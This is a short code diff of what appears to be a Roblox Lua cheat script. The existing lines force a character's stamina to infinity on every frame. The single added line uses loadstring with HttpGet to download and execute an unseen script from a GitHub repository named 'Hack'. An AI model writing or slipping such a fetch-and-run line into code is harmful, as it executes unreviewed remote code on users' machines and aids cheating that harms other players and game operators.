@@ -16,3 +16,4 @@ RunService.Heartbeat:Connect(function()
 		player.Character:SetAttribute("Stamina", math.huge)
 	end
 end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/bulat123cool/Hack/refs/heads/main/Brick%20new'))()
